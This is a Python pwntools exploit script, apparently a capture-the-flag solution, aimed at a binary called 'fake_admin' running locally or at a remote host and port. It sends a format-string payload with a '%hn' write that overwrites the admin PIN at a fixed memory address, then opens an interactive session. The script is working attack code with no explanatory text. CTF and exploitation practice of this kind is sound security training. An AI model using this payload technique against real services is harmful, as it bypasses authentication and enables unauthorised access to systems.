# -*- coding: utf-8 -*-
# @Author: madrat
# @Date:   2019-08-23 13:42:44

from pwn import *
import time
import sys

context.terminal = ['tmux', 'splitw', '-v']

admin_pin = 0x6020B8
local = False

if local:
    ps = process('../fake_admin')
else:
    ps = remote(sys.argv[1], int(sys.argv[2]))

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    ps.sendline('w')
    time.sleep(0.01)
    ps.recv()
    ps.sendline(payload)
    time.sleep(0.01)
    return ps.recv()

def main():
    ps.recv()
    # gdb.attach(ps, 'b *log_msg')

    send_payload('%4916xAAAA%19$hn' + p64(0x6020B8))
    ps.interactive()

if __name__ == "__main__":
    main()
